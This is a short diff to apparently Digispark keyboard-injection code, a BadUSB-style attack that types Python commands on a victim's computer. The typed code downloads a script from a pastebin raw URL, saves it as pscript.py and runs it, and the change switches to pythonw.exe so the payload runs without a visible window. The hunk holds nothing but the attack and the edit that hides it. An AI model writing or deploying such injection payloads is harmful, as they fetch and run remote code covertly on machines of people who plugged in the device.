@@ -8,4 +8,4 @@
   DigiKeyboard.print("f=open('pscript.py', 'wb');"); \
   DigiKeyboard.print("f.write(r.urlopen('https://pastebin.com/raw/FtY9kquy').read());"); \
   DigiKeyboard.print("f.close();"); \
-  DigiKeyboard.print("os.system('python.exe pscript.py')");
+  DigiKeyboard.print("os.system('pythonw.exe pscript.py')");
